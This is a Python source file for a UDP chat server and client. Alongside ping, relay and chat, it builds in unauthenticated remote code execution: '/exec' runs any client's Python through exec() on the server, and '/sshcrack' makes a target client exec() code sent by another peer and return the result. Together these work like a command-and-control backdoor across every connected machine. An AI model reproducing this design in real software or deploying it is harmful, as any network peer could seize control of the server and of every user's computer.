import socket
import threading
import queue
import zlib

"""
UDP protocol
Server port: 5667

commands:
/ping - lists all clients
/ping <client id> - pings target client
/ping server - server echoes back
/exec <code> - runs python code on server
/relay <client id> <message> - sends message to target client
/sshcrack <client id> <command> - executes command on target client
/chat <message> - broadcasts to all clients
"""

# ===================== SERVER ===================== #
class Server:
    def __init__(self, host='0.0.0.0', port=5667):
        self.host = host
        self.port = port
        self.clients = {}  # client_id: addr
        self.addr_to_id = {}  # addr: client_id
        self.clients_lock = threading.Lock()
        self.running = False
        self.msg_queue = queue.Queue()
        self.client_id_seq = 0
        self.free_ids = set()
        self.sock = None

    def _recv_thread(self):
        self.sock.settimeout(1.0)
        while self.running:
            try:
                data, addr = self.sock.recvfrom(4096)
            except socket.timeout:
                continue
            except Exception as e:
                if self.running:
                    print(f"Recv error: {e}")
                break
            
            try:
                with self.clients_lock:
                    if addr not in self.addr_to_id:
                        if self.free_ids:
                            client_id = min(self.free_ids)
                            self.free_ids.remove(client_id)
                        else:
                            self.client_id_seq += 1
                            client_id = self.client_id_seq
                        self.clients[client_id] = addr
                        self.addr_to_id[addr] = client_id
                        print(f"Client {client_id} connected from {addr}")
                    else:
                        client_id = self.addr_to_id[addr]
                
                message = zlib.decompress(data).decode().strip()
                self.msg_queue.put((client_id, message))
            except Exception as e:
                print(f"Message processing error: {e}")

    def start(self):
        self.running = True
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        self.sock.bind((self.host, self.port))
        print(f"UDP Server listening on {self.host}:{self.port}")
        threading.Thread(target=self._recv_thread, daemon=True).start()

    def send(self, client_id, message, exclude_sender=None):
        targets = []
        with self.clients_lock:
            if client_id is None:
                for cid, addr in self.clients.items():
                    if exclude_sender is None or cid != exclude_sender:
                        targets.append(addr)
            else:
                if client_id in self.clients:
                    targets = [self.clients[client_id]]
        
        message_bytes = zlib.compress((message + '\n').encode())
        for addr in targets:
            try:
                self.sock.sendto(message_bytes, addr)
            except Exception as e:
                print(f"Send error: {e}")

    def receive(self):
        """Process all pending messages, return first non-command message"""
        try:
            while True:
                msg = self.msg_queue.get_nowait()
                if msg and msg[1]:
                    if self.iscommand(msg) == 0:
                        return msg
                    # Command was processed, continue to next message
        except queue.Empty:
            return None
        
    def iscommand(self, inp):
        try:
            commands = ["/exec", "/ping", "/req_echo", "/relay", "/sshcrack", "/chat"]
            full_msg = inp[1].strip()
            parts = full_msg.split(maxsplit=1)
            cmd = parts[0]
            rest = parts[1] if len(parts) > 1 else ""

            if cmd in commands:
                if cmd == "/exec":
                    try:
                        exec(rest)
                        log = "successfully executed"
                    except Exception as e:
                        log = str(e)
                    self.send(inp[0], log)
                    print(f"client {inp[0]}: {log}")
                    return 1
                    
                elif cmd == "/ping":
                    if len(parts) == 1:
                        with self.clients_lock:
                            clients = ", ".join(map(str, self.clients.keys()))
                        self.send(inp[0], f"connected clients: {clients}")
                        self.send(inp[0], f"your id is {inp[0]}")
                    elif rest == "server":
                        self.send(inp[0], "Echo")
                    else:
                        self.send(int(rest), f"/req_echo {inp[0]}")
                    return 1
                    
                elif cmd == "/req_echo":
                    self.send(inp[0], "Echo")
                    return 1
                    
                elif cmd == "/sshcrack":
                    if len(parts) > 1 and len(rest.split()) > 1:
                        target = int(rest.split()[0])
                        val = rest.split(maxsplit=1)[1]
                        self.send(target, f"/ssh {val}&{inp[0]}")
                    return 1
                    
                elif cmd == "/relay":
                    args = parts[1].split(maxsplit=1)
                    if len(args) == 2:
                        self.send(int(args[0]), args[1])
                    return 1
                    
                elif cmd == "/chat":
                    self.send(None, rest, inp[0])
                    return 1
            return 0
        except Exception as e:
            self.send(inp[0], f"error: {e}")
            print(f"error: {e}")
            return 1

    def stop(self):
        self.running = False
        if self.sock:
            self.sock.close()
        with self.clients_lock:
            self.clients.clear()
            self.addr_to_id.clear()
            
# ===================== CLIENT ===================== #
class Client:
    def __init__(self, host, port):
        self.host = host
        self.port = port
        self.msg_queue = queue.Queue()
        self.running = False
        self.sock = None
        self.server_addr = (host, port)

    def _recv_thread(self):
        self.sock.settimeout(1.0)
        try:
            while self.running:
                try:
                    data, addr = self.sock.recvfrom(4096)
                except socket.timeout:
                    continue
                if not data:
                    continue
                try:
                    message = zlib.decompress(data).decode().strip()
                    self.msg_queue.put(message)
                except Exception as e:
                    print(f"Message decode error: {e}")
        except Exception as e:
            print("Client recv error:", e)
        finally:
            self.running = False
            self.sock.close()
            self.msg_queue.put(None)

    def connect(self):
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        self.running = True
        threading.Thread(target=self._recv_thread, daemon=True).start()
        self.send("/ping server")  # Register with server
        print(f"Connected to server at {self.host}:{self.port}")

    def send(self, message):
        try:
            message_bytes = zlib.compress((message + '\n').encode())
            self.sock.sendto(message_bytes, self.server_addr)
        except Exception as e:
            print(f"Send error: {e}")
            self.running = False

    def receive(self):
        """Process all pending messages, return first non-command message"""
        try:
            while True:
                msg = self.msg_queue.get_nowait()
                if msg and msg[1]:
                    if self.iscommand(msg) == 0:
                        return msg
                    # Command was processed, continue to next message
        except queue.Empty:
            return None

    def iscommand(self, inp):
        try:
            if inp is None or inp == "":
                return 1
                
            parts = inp.strip().split(maxsplit=1)
            cmd = parts[0]
            rest = parts[1] if len(parts) > 1 else ""

            if cmd == "/req_echo":
                self.send(f"/relay {rest}")
                return 1
                
            elif cmd == "/ssh":
                if "&" in rest:
                    command_part, origin = rest.split("&", 1)
                    self.execute_ssh_command(command_part.strip(), origin)
                    self.send(f"/relay {origin} SSH command executed")
                return 1
                    
            return 0
        except Exception as e:
            print(f"Command error: {e}")
            return 1

    def execute_ssh_command(self, command, origin):
        try:
            parts = command.split(maxsplit=1)
            cmd = parts[0]
            args = parts[1] if len(parts) > 1 else ""
            
            if cmd == "/exec":
                try:
                    exec(args)
                    result = f"SSH exec successful: {args}"
                except Exception as e:
                    result = f"SSH exec error: {str(e)}"
                    
            elif cmd == "/ping":
                result = "SSH ping response: I'm alive!" if not args else f"SSH ping: Echo"
                
            elif cmd == "/relay":
                relay_parts = args.split(maxsplit=1)
                if len(relay_parts) == 2:
                    target, message = relay_parts
                    self.send(f"/relay {target} [SSH-RELAYED] {message}")
                    result = f"SSH relay sent to {target}"
                else:
                    result = "SSH relay: Invalid format"
            else:
                result = f"SSH: Unknown command {cmd}"
                
            self.send(f"/relay {origin} SSH Result: {result}")
        except Exception as e:
            self.send(f"/relay {origin} SSH Error: {str(e)}")

    def disconnect(self):
        self.running = False
        if self.sock:
            try:
                self.sock.close()
            except:
                pass